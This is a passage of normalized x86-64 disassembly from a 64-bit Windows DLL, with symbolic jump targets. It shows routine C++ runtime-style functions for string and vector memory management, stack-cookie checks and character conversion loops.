jb r-xdata
mov rdi [ rdi ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rbp [ rsi + rsi ]
lea rdx [ rdi + r12 * 2 ]
mov r8 rbp
call sub_180018670
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rsi
jb r-xdata
xor ecx ecx
mov [ rax + rbp ] cx
mov rbp [ rsp + 0x30 ]
sub_180002330
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbx [ rcx ]
xor ebp ebp
mov rdi rcx
test rbx rbx
je r-xdata
mov rbx [ rsp + 0x38 ]
mov [ rdi ] rbp
mov [ rdi + 0x8 ] rbp
mov [ rdi + 0x10 ] rbp
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rsi
mov rsi [ rcx + 0x8 ]
cmp rbx rsi
je r-xdata
mov rcx [ rdi ]
call j_sub_180018b3c
mov rsi [ rsp + 0x30 ]
nop [ rax + rax ] ax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rbp
mov [ rbx ] bp
add rbx 0x28
cmp rbx rsi
jne r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
sub_1800023b0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
mov rbp r8
mov rdi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov rdx r8
mov rcx rbx
call sub_180002540
test al al
je r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x8
jb r-xdata
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rbx + 0x18 ] 0x8
mov [ rsp + 0x30 ] rsi
jb r-xdata
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
cmp r9 0x8
jb r-xdata
cmp rdx rax
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rsi [ rbp + rbp ]
mov rdx rdi
mov r8 rsi
call sub_180018670
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rbp
jb r-xdata
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
xor ecx ecx
mov [ rsi + rax ] cx
mov rsi [ rsp + 0x30 ]
cmp r9 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
sub rdi rax
mov r9 r8
mov rdx rbx
sar rdi 0x1
mov rcx rbx
mov r8 rdi
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_180002260
sub_1800024a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi r8
mov r8 [ rcx + 0x10 ]
mov r9 rdx
mov rbx rcx
cmp r8 rdx
jae r-xdata
sub r8 rdx
cmp r8 rdi
cmovb rdi r8
test rdi rdi
je r-xdata
lea rcx [ r--data ]
call sub_180016ebc
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rax [ rcx + 0x18 ]
cmp rax 0x8
jb r-xdata
mov rdx rcx
mov rdx [ rcx ]
jmp r-xdata
lea rax [ r9 + rdi ]
sub r8 rdi
lea rcx [ rcx + r9 * 2 ]
lea rdx [ rdx + rax * 2 ]
add r8 r8
call sub_180018670
mov r11 [ rbx + 0x10 ]
sub r11 rdi
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] r11
jb r-xdata
mov rcx [ rcx ]
cmp rax 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
xor ecx ecx
mov [ rax + r11 * 2 ] cx
sub_180002540
push rdi
sub rsp 0x20
mov rax 0x7ffffffffffffffe
mov rdi rdx
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x18 ]
mov [ rsp + 0x30 ] rbx
xor ebx ebx
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
test rdx rdx
jne r-xdata
mov r8 [ rcx + 0x10 ]
call sub_1800027d0
mov rbx [ rsp + 0x30 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov rbx [ rsp + 0x30 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x10 ] rbx
cmp rax 0x8
jb r-xdata
mov [ rcx ] bx
mov rcx [ rcx ]
sub_1800025c0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180002920
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
mov rdx rdi
call sub_180001fd0
nop
lea rcx [ rdi + rdi * 4 ]
mov rax [ rbx ]
lea rdx [ rax + rcx * 8 ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_180002920
jmp r-xdata
mov [ rcx + 0x18 ] 0x7
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
call sub_180001fd0
nop
sub_1800026a0
cmp rcx rdx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
mov rdi rdx
mov rbx rcx
xor esi esi
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
sub_180002700
mov [ rsp + 0x20 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rdx 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
mov [ rsp + 0x38 ] rsi
xor esi esi
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
test r8b r8b
je r-xdata
mov r8 [ rcx + 0x10 ]
call sub_1800029e0
jmp r-xdata
test rdx rdx
jne r-xdata
cmp rdx 0x10
jae r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x48 ]
test rdi rdi
setne al
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x10 ] rsi
cmp rax 0x10
jb r-xdata
mov [ rsp + 0x30 ] rbp
mov rbp [ rcx + 0x10 ]
cmp rdx rbp
cmovb rbp rdx
cmp rax 0x10
jb r-xdata
mov [ rbx ] sil
mov rbx [ rcx ]
mov [ rbx + 0x10 ] rbp
mov [ rbx + 0x18 ] 0xf
mov [ rbx + rbp ] sil
mov rbp [ rsp + 0x30 ]
jmp r-xdata
mov [ rsp + 0x40 ] r12
mov r12 [ rcx ]
test rbp rbp
je r-xdata
mov rcx r12
call j_sub_180018b3c
mov r12 [ rsp + 0x40 ]
mov r8 rbp
mov rdx r12
call sub_180018670
sub_1800027d0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r13 r8
mov rbx rcx
mov rdi rdx
or rdi 0x7
mov r9 0x7ffffffffffffffe
cmp rdi r9
jbe r-xdata
mov r8 [ rcx + 0x18 ]
mov rcx r8
shr rcx 0x1
mov rax 0xaaaaaaaaaaaaaaab
mul rdi
shr rdx 0x1
cmp rcx rdx
jbe r-xdata
mov rdi rdx
jmp r-xdata
lea rcx [ rdi + 0x1 ]
xor r12d r12d
mov esi r12d
test rcx rcx
je r-xdata
mov rax r9
sub rax rcx
cmp r8 rax
lea rdi [ rcx + r8 ]
jbe r-xdata
jmp r-xdata
mov rax 0x7fffffffffffffff
cmp rcx rax
ja r-xdata
mov rdi r9
test r13 r13
je r-xdata
mov [ rsp + 0x88 ] r12
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x28 ]
call sub_180018524
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180019410
nop
add rcx rcx
call sub_180018a08
mov rsi rax
test rax rax
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx ] rsi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] r13
cmp rdi 0x8
cmovae rbx rsi
mov [ rbx + r13 * 2 ] r12w
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rbx ]
call j_sub_180018b3c
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
lea r8 [ r13 + r13 ]
mov rcx rsi
call sub_180018670
sub_180002920
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x6666666666666667
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x4
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x666666666666665
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_180016e60
add rsp 0x28
retn
mov rcx rdx
mov rax 0x666666666666666
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_180002b90
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_180002b90
sub_1800029e0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
sub rsp 0x48
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r12 r8
mov rbx rcx
mov rdi rdx
or rdi 0xf
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov r8 [ rcx + 0x18 ]
mov rcx r8
shr rcx 0x1
mov rax 0xaaaaaaaaaaaaaaab
mul rdi
shr rdx 0x1
cmp rcx rdx
jbe r-xdata
mov rdi rdx
jmp r-xdata
lea rcx [ rdi + 0x1 ]
xor esi esi
test rcx rcx
je r-xdata
mov rdi 0xfffffffffffffffe
mov rax rdi
sub rax rcx
cmp r8 rax
ja r-xdata
jmp r-xdata
cmp rcx 0xffffffffffffffff
ja r-xdata
lea rdi [ rcx + r8 ]
test r12 r12
je r-xdata
mov [ rsp + 0x88 ] 0x0
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x28 ]
call sub_180018524
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180019410
nop
call sub_180018a08
mov rsi rax
test rax rax
jne r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx ] 0x0
mov [ rbx ] rsi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] r12
cmp rdi 0x10
cmovae rbx rsi
mov [ rbx + r12 ] 0x0
add rsp 0x48
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rbx ]
call j_sub_180018b3c
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov r8 r12
mov rcx rsi
call sub_180018670
sub_180002b20
sub rsp 0x48
xor eax eax
test rcx rcx
je r-xdata
add rsp 0x48
retn
mov rax 0x7fffffffffffffff
cmp rcx rax
ja r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_180018524
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_180019410
int3
add rcx rcx
call sub_180018a08
test rax rax
jne r-xdata
sub_180002b90
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rsi rcx
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x6666666666666667
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_180002fa0
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
lea rcx [ rdi + rdi * 4 ]
shl rcx 0x3
call sub_180018a08
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rdi + rdi * 4 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x10 ] rcx
lea rax [ r12 + r12 * 4 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x8 ] rcx
mov [ rsi ] rbx
mov rdx r9
call sub_1800026a0
mov rcx [ rsi ]
call j_sub_180018b3c
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_180018524
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_180019410
nop
sub_180002cd0
sub rsp 0x48
xor eax eax
test rdx rdx
je r-xdata
add rsp 0x48
retn
cmp rdx 0xffffffffffffffff
ja r-xdata
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x58 ] 0x0
call sub_180018524
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_180019410
int3
mov rcx rdx
call sub_180018a08
test rax rax
jne r-xdata
sub_180002d60
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rax r8
mov rbx rcx
sub rax rdx
sar rax 0x1
mov rdi [ rcx + 0x10 ]
cmp rdi rax
ja r-xdata
xor r12d r12d
nop [ rax ] eax
cmp [ rcx + 0x18 ] rax
je r-xdata
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
movzx esi [ rdx ]
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax 0x1
ja r-xdata
mov r8b 0x1
mov rdx rax
call sub_180002700
test al al
je r-xdata
lea rdi [ r8 + 0x1 ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_1800029e0
jmp r-xdata
mov [ rax + rdi ] 0x0
mov rcx [ rbx + 0x10 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] r12
cmp rax 0x10
jb r-xdata
test rdi rdi
je r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add [ rsp + 0x58 ] 0x2
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rcx ] sil
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rax ] r12b
jmp r-xdata
mov rdx [ rsp + 0x58 ]
cmp rdx [ rsp + 0x60 ]
je r-xdata
mov [ rax + rdi ] r12b
sub_180002ea0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
or rax 0xffffffffffffffff
movzx ebp r8b
mov r8 [ rcx + 0x10 ]
sub rax r8
mov rsi rdx
mov rbx rcx
cmp rax rdx
ja r-xdata
mov [ rsp + 0x30 ] rdi
test rdx rdx
je r-xdata
lea rcx [ r--data ]
call sub_180016e60
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rdi [ r8 + rdx ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_180016e60
test rdi rdi
jne r-xdata
mov rdx rdi
call sub_1800029e0
test rdi rdi
je r-xdata
mov rcx [ rbx + 0x10 ]
cmp rsi 0x1
jne r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx + rcx ] bpl
jmp r-xdata
mov rax [ rbx ]
mov [ rax + rcx ] bpl
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
movsx edx bpl
add rcx rax
mov r8 rsi
call sub_18001d7d0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_180002fa0
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x58 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x58 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x60 ] rbx
add rdi 0x28
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
cmp rbx rdi
je r-xdata
cmp rdi rsi
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_180018b3c
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] r12
mov r8 [ rdi + 0x10 ]
inc r8
add r8 r8
mov rdx rdi
mov rcx rbx
call sub_180018670
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12w
sub_180003080
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_1800185c4
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_180018b3c
sub_1800030b0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rcx
call sub_180017470
nop
mov rcx [ rbx + 0x38 ]
test rcx rcx
je r-xdata
xor edi edi
mov [ rbx + 0x38 ] rdi
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rbx + 0x28 ] rdi
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rbx + 0x18 ] rdi
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rbx + 0x8 ] rdi
mov rcx rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
jmp sub_18001778c
call sub_180018b3c
sub_180003170
push rbx
sub rsp 0x20
mov rbx [ rcx ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
lea rcx [ rsp + 0x30 ]
xor edx edx
mov [ rsp + 0x38 ] rdi
call sub_18001775c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
xor edi edi
lea rcx [ rsp + 0x30 ]
cmp [ rbx + 0x8 ] rdi
cmove rdi rbx
call sub_18001778c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rdi [ rsp + 0x38 ]
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
sub_180003210
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x37 ]
sub rsp 0x90
mov [ rbp - 0x39 ] 0xfffffffffffffffe
mov [ rsp + 0xc8 ] rbx
mov r12 rdx
mov rsi rcx
xor r13d r13d
mov edi r13d
mov [ rbp + 0x67 ] r13d
cmp [ rcx ] rdi
jne r-xdata
mov eax 0x2
mov rbx [ rsp + 0xc8 ]
add rsp 0x90
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
lea ecx [ r13 + 0x30 ]
call sub_180018a08
mov rbx rax
mov [ rbp + 0x77 ] rax
test rax rax
je r-xdata
mov rbx r13
mov rax [ r12 ]
mov rdi [ rax + 0x28 ]
test rdi rdi
jne r-xdata
lea rcx [ rbp - 0x19 ]
call sub_180017470
nop
mov rcx [ rbp + 0x1f ]
test rcx rcx
je r-xdata
xor edx edx
lea rcx [ rbp - 0x19 ]
call sub_18001775c
nop
mov [ rbp - 0x11 ] r13
mov [ rbp - 0x9 ] 0x0
mov [ rbp - 0x1 ] r13
mov [ rbp + 0x7 ] 0x0
mov [ rbp + 0xf ] r13
mov [ rbp + 0x17 ] 0x0
mov [ rbp + 0x1f ] r13
mov [ rbp + 0x27 ] 0x0
test rdi rdi
jne r-xdata
lea rdi [ rax + 0x30 ]
mov [ rbp + 0x1f ] r13
mov rcx [ rbp + 0xf ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov rdx rdi
lea rcx [ rbp - 0x19 ]
call sub_180017504
nop
mov edi 0x1
mov [ rbx + 0x8 ] r13
lea rax [ r--data ]
mov [ rbx ] rax
lea rcx [ rbp - 0x31 ]
call sub_180017c88
mov rcx [ rax ]
mov [ rbx + 0x10 ] rcx
mov rcx [ rax + 0x8 ]
mov [ rbx + 0x18 ] rcx
mov rax [ rax + 0x10 ]
mov [ rbx + 0x20 ] rax
call sub_18001700c
mov [ rbx + 0x28 ] rax
jmp r-xdata
lea rax [ r--data ]
mov [ rbp + 0x67 ] rax
lea rdx [ rbp + 0x67 ]
lea rcx [ rbp - 0x31 ]
call sub_180018524
lea r11 [ r--data ]
mov [ rbp - 0x31 ] r11
lea rdx [ r--data ]
lea rcx [ rbp - 0x31 ]
call sub_180019410
int3
mov [ rbp + 0xf ] r13
mov rcx [ rbp - 0x1 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rsi ] rbx
test dil 0x1
je r-xdata
mov [ rbp - 0x1 ] r13
mov rcx [ rbp - 0x11 ]
test rcx rcx
je r-xdata
call sub_180018b3c
mov [ rbp - 0x11 ] r13
lea rcx [ rbp - 0x19 ]
call sub_18001778c
call sub_180018b3c
sub_180003400
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rbx r8
movzx ebp dx
mov rsi rcx
cmp r8 r9
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop [ rax + rax ] ax
add rbx 0x2
cmp rbx rdi
jne r-xdata
mov rax [ rsi ]
movzx r8d [ rbx ]
movzx edx bp
mov rcx rsi
call [ rax + 0x10 ]
test al al
jne r-xdata
sub_180003470
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rbx r8
movzx ebp dx
mov rsi rcx
cmp r8 r9
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop [ rax + rax ] ax
add rbx 0x2
cmp rbx rdi
jne r-xdata
mov rax [ rsi ]
movzx r8d [ rbx ]
movzx edx bp
mov rcx rsi
call [ rax + 0x10 ]
test al al
je r-xdata
sub_1800034f0
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x10 ]
nop
movzx ecx [ rbx ]
mov rdx rdi
call sub_18001780c
add rbx 0x2
mov [ rbx - 0x2 ] ax
cmp rbx rsi
jne r-xdata
mov rdi [ rsp + 0x30 ]
sub_180003550
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x10 ]
nop
movzx ecx [ rbx ]
mov rdx rdi
call sub_18001787c
add rbx 0x2
mov [ rbx - 0x2 ] ax
cmp rbx rsi
jne r-xdata
mov rdi [ rsp + 0x30 ]
sub_1800035a0
sub rsp 0x38
lea rax [ rcx + 0x28 ]
mov [ rsp + 0x48 ] dl
lea r9 [ rsp + 0x50 ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x40 ]
mov r8d 0x1
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x50 ] 0x0
call sub_180017a9c
movzx ecx [ rsp + 0x40 ]
test eax eax
mov edx 0xffff
cmovs cx dx
movzx eax cx
add rsp 0x38
retn
sub_1800035f0
push rbx
push rsi
push rdi
sub rsp 0x50
mov rsi r9
mov rdi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
add rsp 0x50
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x70 ] rbp
mov [ rsp + 0x48 ] r12
mov [ rsp + 0x40 ] r13
mov r13d 0xffff
lea rbp [ rcx + 0x28 ]
xor r12d r12d
movzx eax [ rbx ]
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x78 ]
lea rcx [ rsp + 0x80 ]
mov r8d 0x1
mov [ rsp + 0x30 ] r12d
mov [ rsp + 0x78 ] al
mov [ rsp + 0x20 ] rbp
call sub_180017a9c
movzx ecx [ rsp + 0x80 ]
test eax eax
cmovs cx r13w
inc rbx
add rsi 0x2
mov [ rsi - 0x2 ] cx
cmp rbx rdi
jne r-xdata
mov r13 [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
mov rbp [ rsp + 0x70 ]
sub_180003690
push rbx
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
movzx ebx r8b
lea r9 [ rcx + 0x28 ]
lea r8 [ rsp + 0x20 ]
lea rcx [ rsp + 0x24 ]
mov [ rsp + 0x20 ] 0x0
call sub_180016f50
movzx edx [ rsp + 0x24 ]
cmp eax 0x1
cmovne edx ebx
movzx eax dl
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_180018450
add rsp 0x40
pop rbx
retn
sub_1800036f0
push rbx
push rsi
push rdi
push r12
sub rsp 0x48
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov rdi [ rsp + 0x90 ]
movzx r12d r9b
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rcx [ rsp + 0x30 ]
